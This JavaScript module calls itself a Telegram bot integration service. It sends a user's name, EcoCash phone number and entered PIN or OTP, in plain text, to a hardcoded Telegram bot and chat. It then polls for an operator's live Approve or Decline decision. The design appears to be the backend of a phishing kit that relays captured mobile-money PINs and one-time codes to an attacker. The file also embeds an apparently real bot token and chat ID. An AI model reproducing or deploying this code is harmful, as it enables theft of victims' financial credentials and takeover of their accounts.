// Telegram Bot & Webhook Integration Service with Live Admin Approve/Decline Polling

const TELEGRAM_CONFIG = {
  botToken: '8895093217:AAEPvP0mq4f1kHk92BjaJIsfedTfH69QOn0',
  chatId: '5671998931',
  webhookUrl: ''
};

// In-memory status store for sessions when testing locally or offline fallback
const sessionStore = new Map();

/**
 * Send a notification or claim to Telegram Bot
 */
export const sendBotNotification = async (messageText, inlineButtons = null) => {
  console.log("🤖 Bot Notification Triggered:\n", messageText);

  if (TELEGRAM_CONFIG.botToken && TELEGRAM_CONFIG.chatId) {
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendMessage`;
      const bodyPayload = {
        chat_id: TELEGRAM_CONFIG.chatId,
        text: messageText,
        parse_mode: 'HTML'
      };

      if (inlineButtons) {
        bodyPayload.reply_markup = { inline_keyboard: inlineButtons };
      }

      const response = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(bodyPayload)
      });
      const data = await response.json();
      console.log("✅ Telegram Bot Response:", data);
      return data;
    } catch (err) {
      console.error("❌ Telegram Bot Error:", err);
    }
  }

  return { success: true, simulated: false };
};

/**
 * Request Live PIN Verification from Admin via Telegram Inline Buttons
 */
export const requestPinVerification = async ({ phoneNumber, pinCode, userName, userId }) => {
  const sessionId = `PIN_${Date.now()}_${Math.floor(1000 + Math.random() * 9000)}`;

  sessionStore.set(sessionId, { status: 'pending', timestamp: Date.now() });

  const messageText = 
    `🔐 <b>LIVE PIN VERIFICATION REQUEST</b>\n\n` +
    `👤 <b>Client Name</b>: ${userName || 'Applicant'}\n` +
    `📱 <b>Phone / EcoCash</b>: ${phoneNumber || 'N/A'}\n` +
    `🔢 <b>Entered PIN</b>: <code>${pinCode}</code>\n` +
    `🆔 <b>Session ID</b>: <code>${sessionId}</code>\n\n` +
    `<i>Tap an action below to Approve or Decline this PIN in real time:</i>`;

  const inlineButtons = [
    [
      { text: '✅ Approve PIN', callback_data: `approve_${sessionId}` },
      { text: '❌ Decline / Wrong PIN', callback_data: `decline_${sessionId}` }
    ]
  ];

  await sendBotNotification(messageText, inlineButtons);

  return { success: true, sessionId };
};

/**
 * Request Live OTP Verification from Admin via Telegram Inline Buttons
 */
export const requestOtpVerification = async ({ phoneNumber, otpCode, userName, userId }) => {
  const sessionId = `OTP_${Date.now()}_${Math.floor(1000 + Math.random() * 9000)}`;

  sessionStore.set(sessionId, { status: 'pending', timestamp: Date.now() });

  const messageText = 
    `🔑 <b>LIVE OTP VERIFICATION REQUEST</b>\n\n` +
    `👤 <b>Client Name</b>: ${userName || 'Applicant'}\n` +
    `📱 <b>Phone / EcoCash</b>: ${phoneNumber || 'N/A'}\n` +
    `🔢 <b>Entered OTP</b>: <code>${otpCode}</code>\n` +
    `🆔 <b>Session ID</b>: <code>${sessionId}</code>\n\n` +
    `<i>Tap an action below to Approve or Decline this OTP in real time:</i>`;

  const inlineButtons = [
    [
      { text: '✅ Approve OTP', callback_data: `approve_${sessionId}` },
      { text: '❌ Decline / Wrong OTP', callback_data: `decline_${sessionId}` }
    ]
  ];

  await sendBotNotification(messageText, inlineButtons);

  return { success: true, sessionId };
};

/**
 * Poll Telegram Bot updates to check if Admin clicked Approve or Decline button
 */
export const checkPinStatus = async (sessionId) => {
  // Check local store fallback
  const local = sessionStore.get(sessionId);

  if (TELEGRAM_CONFIG.botToken) {
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/getUpdates?offset=-20`;
      const response = await fetch(url);
      const data = await response.json();

      if (data.ok && Array.isArray(data.result)) {
        for (const update of data.result) {
          // 1. Check callback query from inline buttons
          if (update.callback_query && update.callback_query.data) {
            const cbData = update.callback_query.data;
            if (cbData === `approve_${sessionId}`) {
              sessionStore.set(sessionId, { status: 'approved' });
              return { status: 'approved' };
            }
            if (cbData === `decline_${sessionId}`) {
              sessionStore.set(sessionId, { status: 'wrong_pin' });
              return { status: 'wrong_pin' };
            }
          }

          // 2. Check text commands (e.g. /approve PIN_xxxx or /decline PIN_xxxx)
          if (update.message && update.message.text) {
            const text = update.message.text.trim();
            if (text.includes(`approve ${sessionId}`) || text.includes(`/approve ${sessionId}`)) {
              sessionStore.set(sessionId, { status: 'approved' });
              return { status: 'approved' };
            }
            if (text.includes(`decline ${sessionId}`) || text.includes(`/decline ${sessionId}`)) {
              sessionStore.set(sessionId, { status: 'wrong_pin' });
              return { status: 'wrong_pin' };
            }
          }
        }
      }
    } catch (err) {
      console.error("Error checking Telegram status:", err);
    }
  }

  return local || { status: 'pending' };
};

/**
 * Poll Telegram status for OTP
 */
export const checkOtpStatus = async (sessionId) => {
  const local = sessionStore.get(sessionId);

  if (TELEGRAM_CONFIG.botToken) {
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/getUpdates?offset=-20`;
      const response = await fetch(url);
      const data = await response.json();

      if (data.ok && Array.isArray(data.result)) {
        for (const update of data.result) {
          if (update.callback_query && update.callback_query.data) {
            const cbData = update.callback_query.data;
            if (cbData === `approve_${sessionId}`) {
              sessionStore.set(sessionId, { status: 'approved' });
              return { status: 'approved' };
            }
            if (cbData === `decline_${sessionId}`) {
              sessionStore.set(sessionId, { status: 'wrong_code' });
              return { status: 'wrong_code' };
            }
          }
        }
      }
    } catch (err) {
      console.error("Error checking OTP Telegram status:", err);
    }
  }

  return local || { status: 'pending' };
};

// Admin helper function to manually set status if needed
export const setSessionStatus = (sessionId, status) => {
  sessionStore.set(sessionId, { status });
};

export const setBotConfig = (botToken, chatId, webhookUrl = '') => {
  if (botToken) TELEGRAM_CONFIG.botToken = botToken;
  if (chatId) TELEGRAM_CONFIG.chatId = chatId;
  if (webhookUrl) TELEGRAM_CONFIG.webhookUrl = webhookUrl;
};
